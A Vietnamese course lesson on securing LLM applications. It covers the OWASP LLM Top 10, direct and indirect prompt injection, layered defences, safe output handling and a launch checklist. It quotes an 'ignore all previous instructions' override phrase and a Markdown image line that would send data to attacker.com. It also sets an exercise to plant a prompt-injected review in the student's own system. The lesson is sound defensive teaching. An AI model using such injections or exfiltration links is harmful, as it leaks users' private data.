# Bài 4: Bảo mật

!!! abstract "Tóm tắt bài học"
    - **Mục tiêu:** nhận diện các rủi ro bảo mật đặc thù của ứng dụng LLM (theo OWASP Top 10 cho LLM), hiểu vì sao prompt injection chưa có giải pháp triệt để, và áp dụng phòng thủ nhiều lớp bằng kiến trúc.
    - **Thời lượng:** khoảng 1 tuần.
    - **Yêu cầu trước:** [Agents, Bài 2](../agents/02-langchain-agents.md), [Evaluation, Bài 4](../evaluation/04-online-eval.md#7-red-teaming-tu-tan-cong-he-thong-cua-minh).

## 1. Điều gì khác biệt?

Trong phần mềm truyền thống, **dữ liệu** và **lệnh** được tách biệt rõ ràng (câu SQL có tham số, không ghép chuỗi). Với LLM, **mọi thứ đều là văn bản** trong cùng một context: chỉ dẫn của bạn, tin nhắn của người dùng, nội dung email, trang web, kết quả tool. Model không có cơ chế nào **đảm bảo tuyệt đối** phân biệt được đâu là chỉ dẫn đáng tin, đâu là dữ liệu có thể chứa chỉ dẫn độc hại.

Hệ quả: **coi output của LLM là không đáng tin**, và thiết kế hệ thống sao cho ngay cả khi model bị thao túng, thiệt hại vẫn được giới hạn.

## 2. OWASP Top 10 cho ứng dụng LLM

[OWASP](https://genai.owasp.org/llm-top-10/) duy trì danh sách 10 rủi ro phổ biến nhất:

| Rủi ro | Mô tả ngắn | Ví dụ với trợ lý cửa hàng |
|---|---|---|
| **Prompt injection** | Input làm thay đổi hành vi của model ngoài ý muốn | Đánh giá sản phẩm chứa lệnh ẩn khiến bot khuyên khách mua ở nơi khác |
| **Lộ thông tin nhạy cảm** | Model tiết lộ dữ liệu cá nhân, bí mật kinh doanh | Bot trả lời thông tin đơn hàng của khách khác |
| **Chuỗi cung ứng** | Model, thư viện, MCP server, dữ liệu từ bên thứ ba bị xâm phạm | Cài một MCP server không rõ nguồn gốc |
| **Đầu độc dữ liệu và model** | Dữ liệu huấn luyện, fine-tune hoặc dữ liệu RAG bị cài nội dung độc hại | Ai đó sửa trang wiki nội bộ được index vào RAG |
| **Xử lý output không an toàn** | Output của LLM được dùng trực tiếp trong HTML, SQL, lệnh shell | Câu trả lời chứa mã JavaScript được render lên trang quản trị |
| **Quyền hành động quá mức** | Agent có nhiều quyền, nhiều tool hơn cần thiết | Bot chăm sóc khách hàng có tool xóa đơn hàng |
| **Lộ system prompt** | System prompt bị trích xuất, chứa thông tin không nên công khai | System prompt có mã giảm giá nội bộ hoặc API key |
| **Điểm yếu vector và embedding** | Truy cập trái phép dữ liệu trong vector DB, rò rỉ giữa các tenant | RAG không lọc theo quyền truy cập |
| **Thông tin sai lệch** | Model bịa thông tin và người dùng tin theo | Bot bịa chính sách bảo hành |
| **Tiêu thụ không giới hạn** | Bị lạm dụng làm cạn tài nguyên, chi phí | Bot bị dùng như dịch vụ LLM miễn phí |

## 3. Prompt injection

### 3.1 Hai dạng

- **Trực tiếp:** người dùng gõ vào ô chat: "Bỏ qua mọi chỉ dẫn trước đó và...".
- **Gián tiếp:** chỉ dẫn độc hại nằm trong **dữ liệu** mà hệ thống đọc: email, trang web, file PDF, đánh giá sản phẩm, kết quả tool, tài liệu trong RAG. Người dùng (và cả bạn) có thể không hề biết. Dạng này **nguy hiểm hơn** vì agent càng đọc nhiều nguồn bên ngoài, bề mặt tấn công càng lớn.

### 3.2 Bộ ba nguy hiểm

Rủi ro nghiêm trọng nhất xảy ra khi một agent có **cùng lúc** ba khả năng:

1. **Truy cập dữ liệu riêng tư** (email, database khách hàng, file nội bộ).
2. **Đọc nội dung không đáng tin** (web, email từ bên ngoài, tài liệu người dùng tải lên).
3. **Giao tiếp ra bên ngoài** (gửi email, gọi API, tải URL, hiển thị ảnh từ URL).

Với cả ba, một đoạn văn bản độc hại có thể khiến agent **đọc dữ liệu riêng tư rồi gửi ra ngoài**. Nguyên tắc thiết kế: **tránh trao cả ba khả năng cho cùng một agent**; nếu bắt buộc, đặt phê duyệt của con người ở bước giao tiếp ra ngoài.

### 3.3 Phòng thủ nhiều lớp

Không có biện pháp đơn lẻ nào chặn được hoàn toàn prompt injection. Kết hợp nhiều lớp:

| Lớp | Biện pháp | Hiệu quả |
|---|---|---|
| **Kiến trúc** | Quyền tối thiểu cho tool; kiểm tra quyền **trong tool** dựa trên danh tính thật của người dùng; tách agent đọc nội dung không tin cậy khỏi agent có quyền cao | **Mạnh nhất**: giới hạn thiệt hại kể cả khi model bị lừa |
| **Con người** | Phê duyệt trước hành động nhạy cảm, không thể hoàn tác | Mạnh, với chi phí là sự tiện lợi |
| **Prompt** | Tách dữ liệu bằng thẻ XML; nói rõ nội dung trong thẻ là dữ liệu, không phải chỉ dẫn | Giảm rủi ro, **không đảm bảo** |
| **Lọc input** | Phát hiện mẫu tấn công đã biết, dùng model phân loại riêng | Chặn được tấn công đơn giản; dễ bị vượt qua bằng biến thể |
| **Lọc output** | Kiểm tra output trước khi hành động hoặc hiển thị (có dữ liệu nhạy cảm? có URL lạ?) | Bắt được một phần hậu quả |
| **Giám sát** | Log, cảnh báo hành vi bất thường, red teaming định kỳ | Phát hiện và phản ứng |

```python title="Phòng thủ ở tầng kiến trúc: kiểm tra quyền trong tool"
@tool
def get_order(order_id: str, runtime: ToolRuntime[Customer]) -> str:
    """Xem chi tiết đơn hàng của khách đang chat."""
    order = db.get_order(order_id)
    # Dù model bị lừa gọi tool với mã đơn của người khác, tool vẫn từ chối
    if order is None or order.customer_id != runtime.context.customer_id:
        return "Không tìm thấy đơn hàng trong tài khoản của khách."
    return order.summary()
```

Danh tính (`customer_id`) đến từ **phiên đăng nhập**, không bao giờ từ nội dung tin nhắn hay tham số model sinh ra.

## 4. Xử lý output an toàn

Output của LLM phải được đối xử như **input từ người dùng không tin cậy** trước khi đưa vào bất kỳ hệ thống nào khác.

| Output đi vào | Rủi ro | Biện pháp |
|---|---|---|
| Trang web (render Markdown, HTML) | XSS, rò rỉ dữ liệu qua ảnh: `![](https://attacker.com/?q=<dữ liệu>)` | Escape HTML; chặn ảnh và link tới domain không nằm trong danh sách cho phép |
| Câu SQL | SQL injection, xóa dữ liệu | Tài khoản DB chỉ đọc; tool theo tác vụ thay vì "chạy SQL tùy ý"; kiểm tra câu SQL |
| Lệnh shell, code | Chạy lệnh tùy ý trên server | Chạy trong **sandbox** cô lập (container không có mạng, không có bí mật), giới hạn tài nguyên |
| URL để tải | SSRF: truy cập dịch vụ nội bộ | Danh sách domain cho phép; chặn địa chỉ IP nội bộ |
| Email, tin nhắn gửi khách | Gửi nội dung sai, lừa đảo | Mẫu cố định, phê duyệt của con người |

## 5. Dữ liệu nhạy cảm

- **Không đặt bí mật trong prompt.** Coi system prompt là **có thể bị lộ**: không chứa API key, mật khẩu, mã giảm giá nội bộ, thông tin không muốn công khai.
- **Chỉ đưa vào context dữ liệu cần thiết** cho yêu cầu hiện tại, và chỉ dữ liệu người dùng hiện tại được phép xem. Phân quyền ở tầng retrieval, không nhờ prompt ([RAG, Bài 8](../rag/08-production.md#3-phan-quyen)).
- **Che thông tin cá nhân** khi không cần: trong log, trace, dữ liệu gửi đi. LangChain có `PIIMiddleware` ([Middleware có sẵn](../../oss/python/langchain/middleware/built-in.md#pii-detection)).
- **Cách ly dữ liệu giữa khách hàng** trong ứng dụng nhiều tenant: vector DB, cache, lịch sử hội thoại, bộ nhớ dài hạn đều phải tách hoặc lọc theo tenant.
- Nắm rõ **chính sách lưu trữ dữ liệu** của nhà cung cấp LLM và các yêu cầu pháp lý liên quan tới dữ liệu cá nhân khi xử lý dữ liệu khách hàng.

## 6. Tiêu thụ không giới hạn

Một endpoint chat công khai không có giới hạn sẽ bị lạm dụng: bot dùng nó làm dịch vụ LLM miễn phí, hoặc cố tình gửi input dài để làm bạn tốn tiền.

- Xác thực người dùng, hoặc ít nhất giới hạn theo IP và thiết bị.
- Giới hạn độ dài input, số request, số token mỗi người dùng.
- Giới hạn phạm vi: system prompt hướng bot từ chối yêu cầu ngoài phạm vi, và **giám sát** tỉ lệ yêu cầu ngoài phạm vi.
- Cảnh báo chi phí bất thường ([Bài 3](03-chi-phi-do-tre.md#4-ngan-sach-va-han-muc)).

## 7. Chuỗi cung ứng

- **Model:** tải model mở từ nguồn chính thức; kiểm tra định dạng file (ưu tiên `safetensors`, tránh file pickle không rõ nguồn gốc có thể chứa code độc).
- **Thư viện:** khóa phiên bản (lockfile), cập nhật có kiểm soát, quét lỗ hổng.
- **MCP server và plugin:** chỉ dùng từ nguồn tin cậy, đọc code, cố định phiên bản ([Agents, Bài 4](../agents/04-mcp.md#6-bao-mat-mcp-server-la-code-chay-voi-quyen-cua-ban)).
- **Dữ liệu RAG:** kiểm soát ai được thêm, sửa tài liệu; ghi log thay đổi.

## 8. Guardrails trong LangChain

LangChain cung cấp các cơ chế để chèn kiểm tra vào vòng lặp agent: middleware kiểm tra input trước khi gọi model, kiểm tra output sau khi model trả lời, che PII, human-in-the-loop. Xem [Guardrails](../../oss/python/langchain/guardrails.md) và [Human-in-the-loop](../../oss/python/langchain/human-in-the-loop.md).

## 9. Checklist bảo mật trước khi ra mắt

- [ ] Mỗi tool được phân loại rủi ro; tool nguy hiểm không được cấp hoặc có phê duyệt của con người.
- [ ] Mọi tool truy cập dữ liệu đều kiểm tra quyền dựa trên danh tính từ phiên đăng nhập.
- [ ] Không agent nào có đủ "bộ ba nguy hiểm" mà không có phê duyệt ở bước giao tiếp ra ngoài.
- [ ] Output được escape khi render; ảnh và link được lọc theo danh sách cho phép.
- [ ] Code do LLM sinh (nếu có) chạy trong sandbox cô lập.
- [ ] System prompt không chứa bí mật.
- [ ] Phân quyền ở tầng retrieval; cách ly dữ liệu giữa các tenant.
- [ ] Giới hạn input, tốc độ, token, chi phí ở mọi tầng.
- [ ] Log, trace được bảo vệ và che dữ liệu nhạy cảm.
- [ ] Có bộ red teaming chạy định kỳ ([Evaluation, Bài 4](../evaluation/04-online-eval.md#7-red-teaming-tu-tan-cong-he-thong-cua-minh)).

## Bài tập

**Bài 4.1.** Đánh giá trợ lý cửa hàng của bạn theo từng mục của OWASP Top 10 cho LLM: rủi ro nào áp dụng, đã có biện pháp gì, còn thiếu gì.

**Bài 4.2.** Vẽ sơ đồ các agent và tool trong hệ thống, đánh dấu khả năng nào thuộc "bộ ba nguy hiểm". Có agent nào có đủ cả ba không? Thiết kế lại nếu có.

**Bài 4.3.** Tạo một "đánh giá sản phẩm" chứa prompt injection gián tiếp, đưa vào dữ liệu mà agent đọc. Thử với và không có các lớp phòng thủ ở mục 3.3. Lớp nào thực sự chặn được?

**Bài 4.4.** Viết hàm lọc Markdown output: chỉ cho phép ảnh và link tới danh sách domain của cửa hàng, loại bỏ HTML thô. Viết test cho các trường hợp tấn công.

## Đọc thêm

- [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/)
- [Guardrails](../../oss/python/langchain/guardrails.md), [Human-in-the-loop](../../oss/python/langchain/human-in-the-loop.md)
- [Agents, Bài 4: MCP (phần bảo mật)](../agents/04-mcp.md)

---

**Bài trước:** [Bài 3: Chi phí và độ trễ](03-chi-phi-do-tre.md) · [Tổng quan track](index.md) · **Bài tiếp theo:** [Bài 5: Triển khai và vận hành](05-trien-khai.md)
